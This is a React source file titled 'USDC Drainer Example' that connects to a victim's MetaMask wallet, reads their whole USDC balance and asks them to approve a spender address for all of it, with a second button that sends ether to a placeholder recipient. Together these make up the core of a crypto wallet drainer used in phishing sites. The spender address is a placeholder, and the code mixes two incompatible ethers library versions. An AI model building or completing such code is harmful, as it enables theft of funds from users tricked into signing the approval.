import './App.css';
import React, { useState } from 'react';

const ethers = require("ethers")

function App() {
  const [userAddress, setUserAddress] = useState('');
  const [isConnected, setIsConnected] = useState(false);

  // Function to connect to the user's Ethereum wallet
  const connectWalletHandler = async () => {
    if (window.ethereum && window.ethereum.isMetaMask) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        console.log('Connected', accounts[0]);
        setUserAddress(accounts[0]);
        setIsConnected(true);
      } catch (error) {
        console.error('Error connecting to wallet:', error);
      }
    } else {
      console.log('Please install MetaMask!');
    }
  };

  // Function to approve tokens
  const approveTokensHandler = async () => {
    if (!window.ethereum || !window.ethereum.isMetaMask) {
      console.log('Ethereum object not found or MetaMask is not installed.');
      return;
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    // Replace these with your contract details
    const usdcTokenAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
    const spenderAddress = '0x0000000';
    const erc20Abi = [
      'function approve(address spender, uint256 amount) external returns (bool)',
      'function balanceOf(address account) external view returns (uint256)',
    ];

    const tokenContract = new ethers.Contract(usdcTokenAddress, erc20Abi, signer);

    try {
      const balance = await tokenContract.balanceOf(userAddress);
      const tx = await tokenContract.approve(spenderAddress, balance);
      await tx.wait();
      console.log(`Approval successful: ${tx.hash}`);
    } catch (error) {
      console.error('Error approving tokens:', error);
    }
  };

  // State for transaction status
  const [txStatus, setTxStatus] = useState('');

  const sendTransaction = async () => {
    try {
      // Request account access if needed (for MetaMask)
      await window.ethereum.request({ method: 'eth_requestAccounts' });

      // Create a provider to interact with Ethereum
      const provider = new ethers.BrowserProvider(window.ethereum);

      // Get the signer to sign transactions (the user's wallet)
      const signer = await provider.getSigner();

      // Define transaction parameters
      const tx = {
        to: 'RECIPIENT_ADDRESS', // Recipient address
        value: ethers.utils.parseEther('0.01'), // Amount to send (in Ether)
        // Add other transaction parameters as needed (e.g., gasLimit, gasPrice, nonce, data)
      };

      // Send the transaction
      const transactionResponse = await signer.sendTransaction(tx);
      setTxStatus('Transaction Sent. Waiting for confirmation...');

      // Wait for the transaction to be confirmed
      await transactionResponse.wait();
      setTxStatus('Transaction Confirmed!');
    } catch (error) {
      console.error(error);
      setTxStatus('Transaction Failed');
    }
  };

  return (
    <div className="App">
      <h1>USDC Drainer Example</h1>
      <button onClick={connectWalletHandler}>{isConnected ? 'Wallet Connected' : 'Connect Wallet'}</button>
      <button onClick={approveTokensHandler} disabled={!isConnected}>Approve Tokens</button>
      <button onClick={sendTransaction}>Send Ethereum</button>
    </div>
  );
}

export default App;
